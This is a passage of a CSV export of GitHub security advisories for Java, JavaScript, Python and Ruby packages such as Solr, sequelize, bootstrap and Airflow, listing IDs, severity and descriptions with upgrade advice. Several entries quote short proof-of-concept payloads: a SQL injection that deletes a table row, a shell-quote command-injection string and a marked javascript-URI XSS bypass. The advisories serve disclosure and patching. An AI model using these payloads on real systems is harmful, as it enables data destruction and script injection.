This vulnerability exposes applications that meet all of the following requirements: Act in the role of an Authorization Server (e.g. @EnableAuthorizationServer) and uses the DefaultRedirectResolver in the AuthorizationEndpoint. 

This vulnerability does not expose applications that: Act in the role of an Authorization Server and uses a different RedirectResolver implementation other than DefaultRedirectResolver, act in the role of a Resource Server only (e.g. @EnableResourceServer), act in the role of a Client only (e.g. @EnableOAuthClient).",maven
1108,34577,org.apache.solr:solr-core,GHSA-xhcq-fv7x-grr2,CVE-2019-0192,https://github.com/advisories/GHSA-xhcq-fv7x-grr2,critical,2019-03-14 15:39:45 UTC,Critical severity vulnerability that affects org.apache.solr:solr-core,"In Apache Solr versions 5.0.0 to 5.5.5 and 6.0.0 to 6.6.5, the Config API allows to configure the JMX server via an HTTP POST request. By pointing it to a malicious RMI server, an attacker could take advantage of Solr's unsafe deserialization to trigger remote code execution on the Solr side.",maven
1109,34577,org.apache.solr:solr-core,GHSA-vrh8-27q8-fr8f,CVE-2017-3164,https://github.com/advisories/GHSA-vrh8-27q8-fr8f,high,2019-03-14 15:39:56 UTC,Server-Side Request Forgery (SSRF) in org.apache.solr:solr-core,"Server Side Request Forgery in Apache Solr, versions 1.3 until 7.6 (inclusive). Since the ""shards"" parameter does not have a corresponding whitelist mechanism, a remote attacker with access to the server could make Solr perform an HTTP GET request to any reachable URL.",maven
1110,34704,org.apache.hive:hive-exec,GHSA-2g9q-chq2-w8qw,CVE-2017-12625,https://github.com/advisories/GHSA-2g9q-chq2-w8qw,moderate,2019-03-14 15:40:16 UTC,"Moderate severity vulnerability that affects org.apache.hive:hive, org.apache.hive:hive-exec, and org.apache.hive:hive-service","Apache Hive 2.1.x before 2.1.2, 2.2.x before 2.2.1, and 2.3.x before 2.3.1 expose an interface through which masking policies can be defined on tables or views, e.g., using Apache Ranger. When a view is created over a given table, the policy enforcement does not happen correctly on the table for masked columns.",maven
1111,36029,org.apache.hive:hive-service,GHSA-gf2v-9hp6-44qg,CVE-2016-3083,https://github.com/advisories/GHSA-gf2v-9hp6-44qg,high,2019-03-14 15:40:32 UTC,"org.apache.hive:hive, org.apache.hive:hive-exec, and org.apache.hive:hive-service vulnerable to Improper Certificate Validation ","Apache Hive (JDBC + HiveServer2) implements SSL for plain TCP and HTTP connections (it supports both transport modes). While validating the server's certificate during the connection setup, the client in Apache Hive before 1.2.2 and 2.0.x before 2.0.1 doesn't seem to be verifying the common name attribute of the certificate. In this way, if a JDBC client sends an SSL request to server abc.com, and the server responds with a valid certificate (certified by CA) but issued to xyz.com, the client will accept that as a valid certificate and the SSL handshake will go through.",maven
1112,34704,org.apache.hive:hive-exec,GHSA-5gvm-hrw5-h6xf,CVE-2015-1772,https://github.com/advisories/GHSA-5gvm-hrw5-h6xf,high,2019-03-14 15:40:44 UTC,"Improper Authentication in org.apache.hive:hive, org.apache.hive:hive-exec, and org.apache.hive:hive-service","The LDAP implementation in HiveServer2 in Apache Hive before 1.0.1 and 1.1.x before 1.1.1, as used in IBM InfoSphere BigInsights 3.0, 3.0.0.1, and 3.0.0.2 and other products, mishandles simple unauthenticated and anonymous bind configurations, which allows remote attackers to bypass authentication via a crafted LDAP request.",maven
1113,34003,org.apache.commons:commons-compress,GHSA-h436-432x-8fvx,CVE-2018-1324,https://github.com/advisories/GHSA-h436-432x-8fvx,moderate,2019-03-14 15:41:12 UTC,Infinite loop in org.apache.commons:commons-compress,A specially crafted ZIP archive can be used to cause an infinite loop inside of Apache Commons Compress' extra field parser used by the ZipFile and ZipArchiveInputStream classes in versions 1.11 to 1.15. This can be used to mount a denial of service attack against services that use Compress' zip package.,maven
1114,20341,webargs,GHSA-8554-jxcw-454q,CVE-2019-9710,https://github.com/advisories/GHSA-8554-jxcw-454q,high,2019-03-12 15:16:12 UTC,High severity vulnerability that affects webargs,"An issue was discovered in webargs before 5.1.3, as used with marshmallow and other products. JSON parsing uses a short-lived cache to store the parsed JSON body. This cache is not thread-safe, meaning that incorrect JSON payloads could have been parsed for concurrent requests.",pip
1115,20810,apache-airflow,GHSA-99cv-8cvv-666c,CVE-2018-20244,https://github.com/advisories/GHSA-99cv-8cvv-666c,moderate,2019-03-06 17:35:58 UTC,High severity vulnerability that affects apache-airflow in Apache Airflow,"In Apache Airflow before 1.10.2, a malicious admin user could edit the state of objects in the Airflow metadata database to execute arbitrary javascript on certain page views.",pip
1116,36764,org.apache.mesos:mesos,GHSA-p2xq-vcm7-xjj6,CVE-2018-11793,https://github.com/advisories/GHSA-p2xq-vcm7-xjj6,high,2019-03-06 17:36:22 UTC,Stack Overflow in Apache Mesos,"When parsing a JSON payload with deeply nested JSON structures, the parser in Apache Mesos versions pre-1.4.x, 1.4.0 to 1.4.2, 1.5.0 to 1.5.1, 1.6.0 to 1.6.1, and 1.7.0 might overflow the stack due to unbounded recursion. A malicious actor can therefore cause a denial of service of Mesos masters rendering the Mesos-controlled cluster inoperable.",maven
1117,18810,bootstrap,GHSA-wh77-3x4m-4q9g,CVE-2019-8331,https://github.com/advisories/GHSA-wh77-3x4m-4q9g,moderate,2019-02-22 20:54:27 UTC,Moderate severity vulnerability that affects bootstrap and bootstrap-sass,"In Bootstrap 4 before 4.3.1 and Bootstrap 3 before 3.4.1, XSS is possible in the tooltip or popover data-template attribute. For more information, see: https://blog.getbootstrap.com/2019/02/13/bootstrap-4-3-1-and-3-4-1/",npm
1118,12993,bootstrap,GHSA-fxwm-579q-49qq,CVE-2019-8331,https://github.com/advisories/GHSA-fxwm-579q-49qq,moderate,2019-02-22 20:54:40 UTC,"Moderate severity vulnerability that affects Bootstrap.Less, bootstrap, and bootstrap.sass","In Bootstrap 4 before 4.3.1 and Bootstrap 3 before 3.4.1, XSS is possible in the tooltip or popover data-template attribute. For more information, see: https://blog.getbootstrap.com/2019/02/13/bootstrap-4-3-1-and-3-4-1/",nuget
1119,19367,bootstrap,GHSA-9v3m-8fp8-mj99,CVE-2019-8331,https://github.com/advisories/GHSA-9v3m-8fp8-mj99,moderate,2019-02-22 20:54:47 UTC,Cross-Site Scripting in bootstrap,"Versions of `bootstrap` prior to 3.4.1 for 3.x and 4.3.1 for 4.x are vulnerable to Cross-Site Scripting (XSS). The  `data-template` attribute of the tooltip and popover plugins lacks input sanitization and may allow attacker to execute arbitrary JavaScript.


## Recommendation

For `bootstrap` 4.x upgrade to 4.3.1 or later.
For `bootstrap` 3.x upgrade to 3.4.1 or later.",rubygems
1120,16246,event-stream,GHSA-mh6f-8j2x-4483,,https://github.com/advisories/GHSA-mh6f-8j2x-4483,critical,2018-11-26 23:58:21 UTC,Critical severity vulnerability that affects event-stream and flatmap-stream,"The NPM package `flatmap-stream` is considered malicious.  A malicious actor added this package as a dependency to the NPM `event-stream` package in version `3.3.6`.  Users of `event-stream` are encouraged to downgrade to the last non-malicious version, `3.3.4`, or upgrade to the latest  4.x version. 

Users of `flatmap-stream` are encouraged to remove the dependency entirely.
",npm
1121,16044,ws,GHSA-2mhh-w6q8-5hxw,CVE-2016-10518,https://github.com/advisories/GHSA-2mhh-w6q8-5hxw,low,2019-02-18 23:56:42 UTC,Remote Memory Disclosure in ws,"Versions of `ws` prior to 1.0.1 are affected by a remote memory disclosure vulnerability.

In certain rare circumstances, applications which allow users to control the arguments of a `client.ping()` call will cause `ws` to send the contents of an allocated but non-zero-filled buffer to the server. This may disclose sensitive information that still exists in memory after previous use of the memory for other tasks.



## Proof of Concept
```
var ws = require('ws')

var server = new ws.Server({ port: 9000 })
var client = new ws('ws://localhost:9000')

client.on('open', function () {
  console.log('open')
  client.ping(50) // this sends a non-zeroed buffer of 50 bytes

  client.on('pong', function (data) {
    console.log('got pong')
    console.log(data) // Data from the client. 
  })
})
```


## Recommendation

Update to version 1.0.1 or greater.",npm
1122,16330,sequelize,GHSA-98pq-pmw9-4gpm,CVE-2016-10550,https://github.com/advisories/GHSA-98pq-pmw9-4gpm,high,2019-02-18 23:54:34 UTC,SQL Injection in sequelize,"Affected versions of `sequelize` are vulnerable to SQL Injection in locations where user input is passed into the `limit` or `order` parameters of `sequelize` query calls, such as `findOne` or `findAll`.



## Recommendation

Update to version 3.17.0 or later.",npm
1123,16330,sequelize,GHSA-2v7q-2xqx-f4q5,CVE-2016-10553,https://github.com/advisories/GHSA-2v7q-2xqx-f4q5,high,2019-02-18 23:54:32 UTC,Potential SQL Injection in sequelize,"Affected versions of `sequelize` are vulnerable to SQL Injection when user input is passed into `findOne` or into a statement such as `where: ""user input""`.



## Recommendation

Update to version 3.0.0 or later.

Version 3.0.0 will introduce a number of breaking changes.
Thankfully, the project authors have provided a 2.x -> 3.x [upgrade guide](https://github.com/sequelize/sequelize/wiki/Upgrade-from-2.0-to-3.0) to ease this transition.

If upgrading is not an option, it is also possible to mitigate this by ensuring that all uses of `where: ""input""` and `findOne(""input"")` are properly sanitized, such as by the use of a wrapper function.",npm
1124,16330,sequelize,GHSA-x2jc-pwfj-h9p3,CVE-2016-10554,https://github.com/advisories/GHSA-x2jc-pwfj-h9p3,moderate,2019-02-18 23:54:28 UTC,SQL Injection in sequelize,"Affected versions of `sequelize` use MySQL's backslash-based escape syntax when connecting to SQLite, despite the fact that SQLite uses PostgreSQL's escape syntax, which can result in a SQL Injection vulnerability.


## Recommendation

Update to version 1.7.0-alpha3 or later.",npm
1125,16330,sequelize,GHSA-9c2p-jw8p-f84v,CVE-2016-10556,https://github.com/advisories/GHSA-9c2p-jw8p-f84v,critical,2019-02-18 23:54:24 UTC,SQL Injection in sequelize,"Affected versions of `sequelize` cast arrays to strings and fail to properly escape the resulting SQL statement, resulting in a SQL injection vulnerability.


## Proof of Concept
In Postgres, SQLite, and Microsoft SQL Server there is an issue where arrays are treated as strings and improperly escaped.

Example Query:
```
database.query('SELECT * FROM TestTable WHERE Name IN (:names)', {
  replacements: {
    names: directCopyOfUserInput
  }
});
```

If the user inputs the value of `:names` as:
```
[""test"", ""'); DELETE TestTable WHERE Id = 1 --')""]
```

The resulting SQL statement will be:
```
SELECT Id FROM Table WHERE Name IN ('test', '\'); DELETE TestTable WHERE Id = 1 --')
```
As the backslash has no special meaning in PostgreSQL, MSSQL, or SQLite, the statement will delete the record in TestTable with an Id of 1.


## Recommendation

Update to version 3.20.0 or later.",npm
1126,17733,sails,GHSA-qmv4-jgp7-mf68,CVE-2016-10549,https://github.com/advisories/GHSA-qmv4-jgp7-mf68,high,2019-02-18 23:40:10 UTC,Sails before 0.12.7 vulnerable to Broken CORS,"Affected versions of `sails` have an issue with the CORS configuration where the value of the origin header is reflected as the value for the `Access-Control-Allow-Origin` header. This may allow an attacker to make AJAX requests to vulnerable hosts through cross-site scripting or a malicious HTML Document, effectively bypassing the Same Origin Policy. 

## Mitigating Factors

This is only an issue when `allRoutes` is set to `true` and `origin` is set to `*` or left commented out in the sails CORS config file. 

The problem can be compounded when the cors `credentials` setting is not provided, because at that point authenticated cross domain requests are possible.


## Recommendation

Update to version 0.12.7 or later.

As this vulnerability is primarily a user error, the patch for the vulnerability will simply cause the application to write an error message to the console when a vulnerable configuration is used in a production environment.

Writing a proper CORS configuration is still the responsibility of the user, so it is necessary to check for the error message after installing the patch. Be sure you are not using `allRoutes: true` with `origin:'*'`, and that you uncomment `origin` and set it to a reasonable value. Ensure that if `origin` is set to `*` that you truly mean for all other websites to be able to make cross-domain requests to your API.

Likewise, ensure `credentials` is uncommented out and set to the appropriate value. Make sure to explicitly set which origins may request resources via CORS.",npm
1127,16044,ws,GHSA-6663-c963-2gqg,CVE-2016-10542,https://github.com/advisories/GHSA-6663-c963-2gqg,high,2019-02-18 23:58:35 UTC,DoS due to excessively large websocket message in ws,"Affected versions of `ws` do not appropriately limit the size of incoming websocket payloads, which may result in a denial of service condition when the node process crashes after receiving a large payload.



## Recommendation

Update to version 1.1.1 or later. 
Alternatively, set the `maxpayload` option for the `ws` server to a value smaller than 256MB.",npm
1128,17489,shell-quote,GHSA-qg8p-v9q4-gh34,CVE-2016-10541,https://github.com/advisories/GHSA-qg8p-v9q4-gh34,critical,2019-02-18 23:58:29 UTC,Potential Command Injection in shell-quote,"Affected versions of `shell-quote` do not properly escape command line arguments, which may result in command injection if the library is used to escape user input destined for use as command line arguments.



## Proof of Concept:

The following characters are not escaped properly: `>`,`;`,`{`,`}`

Bash has a neat but not well known feature known as ""Bash Brace Expansion"", wherein a sub-command can be executed without spaces by running it between a set of `{}` and using the `,` instead of ` ` to seperate arguments. Because of this, full command injection is possible even though it was initially thought to be impossible. 

```
   const quote = require('shell-quote').quote;
   console.log(quote(['a;{echo,test,123,234}']));
   // Actual                    ""a;{echo,test,123,234}""
   // Expected                  ""a\;\{echo,test,123,234\}""
   // Functional Equivalent     ""a; echo 'test' '123' '1234'""
```



## Recommendation

Update to version 1.6.1 or later.",npm
1129,17384,cli,GHSA-6cpc-mj5c-m9rq,CVE-2016-10538,https://github.com/advisories/GHSA-6cpc-mj5c-m9rq,low,2019-02-18 23:40:03 UTC,Arbitrary File Write in cli,"Affected versions of `cli` use predictable temporary file names. If an attacker can create a symbolic link at the location of one of these temporarly file names, the attacker can arbitrarily write to any file that the user which owns the `cli` process has permission to write to.


## Proof of Concept

By creating Symbolic Links at the following locations, the target of the link can be written to.
```
lock_file = '/tmp/' + cli.app + '.pid',
log_file = '/tmp/' + cli.app + '.log';
```


## Recommendation

Update to version 1.0.0 or later.",npm
1130,16571,backbone,GHSA-j6p2-cx3w-6jcp,CVE-2016-10537,https://github.com/advisories/GHSA-j6p2-cx3w-6jcp,high,2019-02-18 23:39:55 UTC,Cross-Site Scripting in backbone,"Affected versions of `backbone` are vulnerable to cross-site scripting when users are allowed to supply input to the `Model#Escape` function, and the output is then written to the DOM. 

The vulnerability occurs as a result of the regular expression used to encode metacharacters failing to take HTML Entities such as `&#60;` into account.


## Recommendation

Update to version 0.5.0 or later.",npm
1131,17433,electron-packager,GHSA-q43m-ffwr-rpcc,CVE-2016-10534,https://github.com/advisories/GHSA-q43m-ffwr-rpcc,low,2019-02-18 23:58:24 UTC,SSL Validation Defaults to False in electron-packager,"Affected versions of `electron-packager` configure the generated application to disable SSL certificate verification by default. 

This could allow an attacker with a privileged network position to launch a Man In The Middle (MITM) attack on the install process, intercepting the step where electron-packager downloads Electron for supported target platforms and architectures, and replacing the valid download with a tampered malicious one.

This only affects users using the electron-packager CLI. The strict-ssl option defaults to true for the node.js API.


## Recommendation

1. Update to version 7.0.0 or later.
2. Delete the `electron-download` cache folder, which is by default located at `~/.electron`.",npm
1132,16065,marked,GHSA-vfvf-mqq8-rwqc,CVE-2016-10531,https://github.com/advisories/GHSA-vfvf-mqq8-rwqc,high,2019-02-18 23:58:20 UTC,Sanitization bypass using HTML Entities in marked,"Affected versions of `marked` are susceptible to a cross-site scripting vulnerability in link components when `sanitize:true` is configured. 

## Proof of Concept

This flaw exists because link URIs containing HTML entities get processed in an abnormal manner. Any HTML Entities get parsed on a best-effort basis and included in the resulting link, while if that parsing fails that character is omitted.

For example:

A link URI such as
```
javascript&#x58document;alert&#40;1&#41;
```
Renders a valid link that when clicked will execute `alert(1)`.


## Recommendation

Update to version 0.3.6 or later.",npm
1133,17639,grunt-gh-pages,GHSA-rrj3-qmh8-72pf,CVE-2016-10526,https://github.com/advisories/GHSA-rrj3-qmh8-72pf,moderate,2019-02-18 23:39:11 UTC,grunt-gh-pages before 0.10.0 may allow unencrypted GitHub credentials to be written to a log file,"Versions of `grunt-gh-pages` prior to 0.10.0 are affected by a vulnerability which may cause unencrypted GitHub credentials to be written to a log file in certain circumstances.

In the `grunt-gh-pages` deployment scenario where authentication is performed by injecting a GitHub token directly into the auth portion of the URL, `grunt-gh-pages` will write the token to a log file, unencrypted.


## Recommendation

Update to version 0.10.0 or later.",npm
1134,16334,chromedriver,GHSA-jh5w-6964-x5cf,CVE-2016-10579,https://github.com/advisories/GHSA-jh5w-6964-x5cf,high,2019-02-18 23:58:05 UTC,Downloads Resources over HTTP in chromedriver,"Affected versions of `chromedriver` insecurely download resources over HTTP. 

In scenarios where an attacker has a privileged network position, they can modify or read such resources at will. This may result in arbitrary code execution if an attacker intercepts and modifies the downloaded binary file, replacing it with a malicious one. 



## Recommendation

Update to version 2.26.1 or later.",npm
1135,18808,lodash,GHSA-4xc9-xhrj-v574,CVE-2018-16487,https://github.com/advisories/GHSA-4xc9-xhrj-v574,high,2019-02-07 18:16:48 UTC,Prototype Pollution in lodash,"Versions of `lodash` before 4.17.5 are vulnerable to prototype pollution. 

The vulnerable functions are 'defaultsDeep', 'merge', and 'mergeWith' which allow a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.




## Recommendation

Update to version 4.17.11 or later.",npm
1136,17388,node.extend,GHSA-r96c-57pf-9jjm,CVE-2018-16491,https://github.com/advisories/GHSA-r96c-57pf-9jjm,moderate,2019-02-07 18:17:34 UTC,Prototype Pollution in node.extend,"Versions of `node.extend` before 1.1.7 or 2.0.1 are vulnerable to prototype pollution. 


## Recommendation

Update to version 1.1.7, 2.0.1 or later.",npm
1137,16161,extend,GHSA-qrmc-fj45-qfc2,CVE-2018-16492,https://github.com/advisories/GHSA-qrmc-fj45-qfc2,moderate,2019-02-07 18:03:28 UTC,Prototype Pollution in extend,"Versions of `extend` prior to 3.0.2 (for 3.x) and 2.0.2 (for 2.x) are vulnerable to Prototype Pollution. The `extend()` function allows attackers to modify the prototype of Object causing the addition or modification of an existing property that will exist on all objects.




## Recommendation

If you're using `extend` 3.x upgrade to 3.0.2 or later.
If you're using `extend` 2.x upgrade to 2.0.2 or later.",npm
1138,20194,pyspark,GHSA-fvxv-9xxr-h7wj,CVE-2018-11760,https://github.com/advisories/GHSA-fvxv-9xxr-h7wj,moderate,2019-02-07 18:02:21 UTC,Moderate severity vulnerability that affects pyspark,"When using PySpark , it's possible for a different local user to connect to the Spark application and impersonate the user running the Spark application. This affects versions 1.x, 2.0.x, 2.1.x, 2.2.0 to 2.2.2, and 2.3.0 to 2.3.1.",pip
1139,20591,colander,GHSA-rv95-4wxj-6fqq,CVE-2017-18361,https://github.com/advisories/GHSA-rv95-4wxj-6fqq,high,2019-02-07 18:18:22 UTC,Loop with Unreachable Exit Condition ('Infinite Loop') in Pylons Colander,"In Pylons Colander through 1.6, the URL validator allows an attacker to potentially cause an infinite loop thereby causing a denial of service via an unclosed parenthesis.",pip
1140,34530,com.mchange:c3p0,GHSA-q485-j897-qc27,CVE-2018-20433,https://github.com/advisories/GHSA-q485-j897-qc27,critical,2019-01-07 19:14:34 UTC,XML External Entity Reference in mchange:c3p0,c3p0 0.9.5.2 allows XXE in extractXmlConfigFromInputStream in com/mchange/v2/c3p0/cfg/C3P0ConfigXmlUtils.java during initialization.,maven
1141,20810,apache-airflow,GHSA-77rc-x84q-pv4f,CVE-2018-20245,https://github.com/advisories/GHSA-77rc-x84q-pv4f,high,2019-01-25 16:19:19 UTC,Improper Certificate Validation in Apache Airflow,The LDAP auth backend (airflow.contrib.auth.backends.ldap_auth) prior to Apache Airflow 1.10.1 was misconfigured and contained improper checking of exceptions which disabled server certificate checking.,pip
1142,20810,apache-airflow,GHSA-68wv-rjrm-576p,CVE-2017-17835,https://github.com/advisories/GHSA-68wv-rjrm-576p,high,2019-01-25 16:19:14 UTC,Cross-Site Request Forgery (CSRF) in Apache Airflow,"In Apache Airflow 1.8.2 and earlier, a CSRF vulnerability allowed for a remote command injection on a default install of Airflow.",pip
1143,20810,apache-airflow,GHSA-9gqg-3fxr-9hv7,CVE-2017-17836,https://github.com/advisories/GHSA-9gqg-3fxr-9hv7,critical,2019-01-25 16:19:09 UTC,Cross site scripting in apache-airflow,"In Apache Airflow 1.8.2 and earlier, an experimental Airflow feature displayed authenticated cookies, as well as passwords to databases used by Airflow. An attacker who has limited access to airflow, weather it be via XSS or by leaving a machine unlocked can exfil all credentials from the system.",pip
1144,20810,apache-airflow,GHSA-8fg4-j562-mjrc,CVE-2017-15720,https://github.com/advisories/GHSA-8fg4-j562-mjrc,high,2019-01-25 16:19:01 UTC,Improper Input Validation in Apache Airflow resulting in Remote Code Execution,"In Apache Airflow 1.8.2 and earlier, an authenticated user can execute code remotely on the Airflow webserver by creating a special object.",pip
1145,36061,org.springframework.batch:spring-batch-core,GHSA-3wc8-659g-r88q,CVE-2019-3774,https://github.com/advisories/GHSA-3wc8-659g-r88q,low,2019-01-25 16:18:56 UTC,Low severity vulnerability that affects org.springframework.batch:spring-batch-core,"Spring Batch versions 3.0.9, 4.0.1, 4.1.0, and older unsupported versions, were susceptible to XML External Entity Injection (XXE) when receiving XML data from untrusted sources.",maven
1146,37978,org.springframework.ws:spring-xml,GHSA-8222-6fc8-mhvf,CVE-2019-3773,https://github.com/advisories/GHSA-8222-6fc8-mhvf,critical,2019-01-25 16:18:52 UTC,Vulnerability that affects org.springframework.ws:spring-ws and org.springframework.ws:spring-xml,"Spring Web Services, versions 2.4.3, 3.0.4, and older unsupported versions of all three projects, were susceptible to XML External Entity Injection (XXE) when receiving XML data from untrusted sources.",maven
1147,18823,nokogiri,GHSA-6qvp-r6r3-9p7h,CVE-2018-14404,https://github.com/advisories/GHSA-6qvp-r6r3-9p7h,high,2019-01-17 14:05:03 UTC,NULL Pointer Dereference in nokogiri,A NULL pointer dereference vulnerability exists in the xpath.c:xmlXPathCompOpEval() function of libxml2 through 2.9.8 when parsing an invalid XPath expression in the XPATH_OP_AND or XPATH_OP_OR case. Applications processing untrusted XSL format inputs with the use of the libxml2 library may be vulnerable to a denial of service attack due to a crash of the application.,rubygems
1148,18810,bootstrap,GHSA-ph58-4vrj-w6hr,CVE-2018-20677,https://github.com/advisories/GHSA-ph58-4vrj-w6hr,moderate,2019-01-17 13:57:56 UTC,XSS vulnerability that affects bootstrap,"In Bootstrap before 3.4.0, XSS is possible in the affix configuration target property.",npm
1149,18810,bootstrap,GHSA-3mgp-fx93-9xv5,CVE-2018-20676,https://github.com/advisories/GHSA-3mgp-fx93-9xv5,moderate,2019-01-17 13:57:34 UTC,XSS vulnerability that affects bootstrap,"In Bootstrap before 3.4.0, XSS is possible in the tooltip data-viewport attribute.",npm
1150,18810,bootstrap,GHSA-4p24-vmcr-4gqj,CVE-2016-10735,https://github.com/advisories/GHSA-4p24-vmcr-4gqj,moderate,2019-01-17 13:57:27 UTC,XSS vulnerability that affects bootstrap,"In Bootstrap 3.x before 3.4.0 and 4.x-beta before 4.0.0-beta.2, XSS is possible in the data-target attribute. Note that this is a different vulnerability than CVE-2018-14041.

See https://blog.getbootstrap.com/2018/12/13/bootstrap-3-4-0/ for more info.",npm
1151,34054,org.apache.thrift:libthrift,GHSA-vx85-mj8c-4qm6,CVE-2018-11798,https://github.com/advisories/GHSA-vx85-mj8c-4qm6,moderate,2019-01-17 13:56:33 UTC,Moderate severity vulnerability that affects org.apache.thrift:libthrift,The Apache Thrift Node.js static web server in versions 0.9.2 through 0.11.0 have been determined to contain a security vulnerability in which a remote user has the ability to access files outside the set webservers docroot path.,maven
1152,34054,org.apache.thrift:libthrift,GHSA-wjxj-f8rg-99wx,CVE-2018-1320,https://github.com/advisories/GHSA-wjxj-f8rg-99wx,high,2019-01-17 13:56:40 UTC,Improper Input Validation in Apache Thrift,Apache Thrift Java client library versions 0.5.0 through 0.11.0 can bypass SASL negotiation isComplete validation in the org.apache.thrift.transport.TSaslTransport class. An assert used to determine if the SASL handshake had successfully completed could be disabled in production settings making the validation incomplete.,maven
1153,20045,bleach,GHSA-m9mq-p2f9-cfqv,CVE-2018-7753,https://github.com/advisories/GHSA-m9mq-p2f9-cfqv,critical,2019-01-04 17:46:30 UTC,Critical severity vulnerability that affects bleach,"An issue was discovered in Bleach 2.1.x before 2.1.3. Attributes that have URI values weren't properly sanitized if the values contained character entities. Using character entities, it was possible to construct a URI value with a scheme that was not allowed that would slide through unsanitized.",pip
1154,36192,org.apache.karaf:apache-karaf,GHSA-cq9c-55r7-455x,CVE-2018-11787,https://github.com/advisories/GHSA-cq9c-55r7-455x,high,2019-01-07 19:14:51 UTC,Improper Authentication in Apache Karaf,"In Apache Karaf version prior to 3.0.9, 4.0.9, 4.1.1, when the webconsole feature is installed in Karaf, it is available at .../system/console and requires authentication to access it. One part of the console is a Gogo shell/console that gives access to the command line console of Karaf via a Web browser, and when navigated to it is available at .../system/console/gogo. Trying to go directly to that URL does require authentication. And optional bundle that some applications use is the Pax Web Extender Whiteboard, it is part of the pax-war feature and perhaps others. When it is installed, the Gogo console becomes available at another URL .../gogo/, and that URL is not secured giving access to the Karaf console to unauthenticated users. A mitigation for the issue is to manually stop/uninstall Gogo plugin bundle that is installed with the webconsole feature, although of course this removes the console from the .../system/console application, not only from the unauthenticated endpoint. One could also stop/uninstall the Pax Web Extender Whiteboard, but other components/applications may require it and so their functionality would be reduced/compromised.",maven
1155,36192,org.apache.karaf:apache-karaf,GHSA-chj8-5xgw-wcvj,CVE-2016-8750,https://github.com/advisories/GHSA-chj8-5xgw-wcvj,moderate,2019-01-07 19:14:46 UTC,Moderate severity vulnerability that affects org.apache.karaf:apache-karaf,"Apache Karaf prior to 4.0.8 used the LDAPLoginModule to authenticate users to a directory via LDAP. However, it did not encoding usernames properly and hence was vulnerable to LDAP injection attacks leading to a denial of service.",maven
1156,15808,react-dom,GHSA-mvjj-gqq2-p4hw,CVE-2018-6341,https://github.com/advisories/GHSA-mvjj-gqq2-p4hw,low,2019-01-04 19:05:35 UTC,Cross-Site Scripting in react-dom,"Affected versions of `react-dom` are vulnerable to Cross-Site Scripting (XSS). The package fails to validate attribute names in HTML tags which may lead to Cross-Site Scripting in specific scenarios. This may allow attackers to execute arbitrary JavaScript in the victim's browser. To be affected by this vulnerability, the application needs to:
- be a server-side React app
- be rendered to HTML using `ReactDOMServer`
- include an attribute name from user input in an HTML tag


## Recommendation

If you are using `react-dom` 16.0.x, upgrade to 16.0.1 or later.  
If you are using `react-dom` 16.1.x, upgrade to 16.1.2 or later.  
If you are using `react-dom` 16.2.x, upgrade to 16.2.1 or later.  
If you are using `react-dom` 16.3.x, upgrade to 16.3.3 or later.  
If you are using `react-dom` 16.4.x, upgrade to 16.4.2 or later.",npm
1157,20077,mistune,GHSA-98gj-wwxm-cj3h,CVE-2017-16876,https://github.com/advisories/GHSA-98gj-wwxm-cj3h,moderate,2019-01-04 17:47:50 UTC,Moderate severity vulnerability that affects mistune,"Cross-site scripting (XSS) vulnerability in the _keyify function in mistune.py in Mistune before 0.8.1 allows remote attackers to inject arbitrary web script or HTML by leveraging failure to escape the ""key"" argument.",pip
1158,16112,react-dev-utils,GHSA-29gp-92wp-94q8,CVE-2018-6342,https://github.com/advisories/GHSA-29gp-92wp-94q8,high,2019-01-04 17:41:20 UTC,react-dev-utils on Windows vulnerable to Remote Code Execution,"`react-dev-utils` on Windows is vulnerable to remote code execution.


## Recommendation

Update to one of the following versions, depending on the release line that you are using.
- 1.0.4
- 2.0.2
- 3.1.2
- 4.2.2
- 5.0.2
- 6.0.0-next.a671462c",npm
1159,15821,webpack-dev-server,GHSA-cf66-xwfp-gvc4,CVE-2018-14732,https://github.com/advisories/GHSA-cf66-xwfp-gvc4,high,2019-01-04 17:40:59 UTC,Missing Origin Validation in webpack-dev-server,"Versions of `webpack-dev-server` before 3.1.10 are missing origin validation on the websocket server. This vulnerability allows a remote attacker to steal a developer's source code because the origin of requests to the websocket server that is used for Hot Module Replacement (HMR) are not validated.


## Recommendation
For `webpack-dev-server` update to version 3.1.11 or later.",npm
1160,18810,bootstrap,GHSA-pj7m-g53m-7638,CVE-2018-14041,https://github.com/advisories/GHSA-pj7m-g53m-7638,moderate,2018-09-13 15:49:56 UTC,Moderate severity vulnerability that affects bootstrap,"In Bootstrap before 4.1.2, XSS is possible in the data-target property of scrollspy. This is similar to CVE-2018-14042.",npm
1161,34455,org.apache.tika:tika-core,GHSA-3448-vfvv-xp9g,CVE-2018-17197,https://github.com/advisories/GHSA-3448-vfvv-xp9g,moderate,2018-12-26 17:45:07 UTC,Moderate severity vulnerability that affects org.apache.tika:tika-core,A carefully crafted or corrupt sqlite file can cause an infinite loop in Apache Tika's SQLite3Parser in versions 1.8-1.19.1 of Apache Tika.,maven
1162,36192,org.apache.karaf:apache-karaf,GHSA-9448-c9wq-jg9v,CVE-2018-11786,https://github.com/advisories/GHSA-9448-c9wq-jg9v,high,2018-12-21 17:49:33 UTC,Improper Privilege Management in Apache Karaf,"In Apache Karaf prior to 4.2.0 release, if the sshd service in Karaf is left on so an administrator can manage the running instance, any user with rights to the Karaf console can pivot and read/write any file on the file system to which the Karaf process user has access. This can be locked down a bit by using chroot to change the root directory to protect files outside of the Karaf install directory; it can be further locked down by defining a security manager policy that limits file system access to those directories beneath the Karaf home that are necessary for the system to run. However, this still allows anyone with ssh access to the Karaf process to read and write a large number of files as the Karaf process user.",maven
1163,35825,org.keycloak:keycloak-core,GHSA-gf2j-7qwg-4f5x,CVE-2018-14637,https://github.com/advisories/GHSA-gf2j-7qwg-4f5x,high,2018-12-21 17:48:45 UTC,Improper Authentication in Keycloak,The SAML broker consumer endpoint in Keycloak before version 4.6.0.Final ignores expiration conditions on SAML assertions. An attacker can exploit this vulnerability to perform a replay attack.,maven
1164,34248,com.squareup.retrofit2:retrofit,GHSA-j379-9jr9-w5cq,CVE-2018-1000844,https://github.com/advisories/GHSA-j379-9jr9-w5cq,critical,2018-12-21 17:48:26 UTC,XML External Entity (XXE) vulnerability in Square Retrofit,Square Open Source Retrofit versions prior to commit 4a693c5aeeef2be6c7ecf80e7b5ec79f6ab59437 contain a XML External Entity (XXE) vulnerability in JAXB. An attacker could use this to remotely read files from the file system or to perform SSRF. This vulnerability appears to have been fixed in commit 4a693c5aeeef2be6c7ecf80e7b5ec79f6ab59437.,maven
